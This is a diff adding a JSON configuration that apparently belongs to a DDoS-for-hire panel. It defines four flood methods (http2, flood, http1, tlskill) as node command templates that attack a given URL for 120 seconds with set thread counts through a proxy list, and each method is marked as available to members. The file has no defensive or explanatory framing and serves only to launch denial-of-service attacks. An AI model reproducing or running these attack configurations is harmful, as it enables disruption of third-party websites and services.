@@ -1,0 +1,26 @@
+{
+    "http2": {
+        "command": "node --max-old-space-size=65536 http2 url 120 5 5 live.txt --redirect true --ratelimit true --query true",
+        "url": "url",
+        "time": 120,
+        "visibility": "MEMBER"
+    },
+    "flood": {
+        "command": "node --max-old-space-size=65536 flood url 120 10 10 live.txt flood",
+        "url": "url",
+        "time": 120,
+        "visibility": "MEMBER"
+    },
+    "http1": {
+        "command": "node --max-old-space-size=65536 http1 POST url live.txt 120 10 10 cookie= randomstring= headerdata= postdata=",
+        "url": "url",
+        "time": 120,
+        "visibility": "MEMBER"
+    },
+    "tlskill": {
+        "command": "node --max-old-space-size=65536 tlskill url 120 10 10 live.txt",
+        "url": "url",
+        "time": 120,
+        "visibility": "MEMBER"
+    }
+}
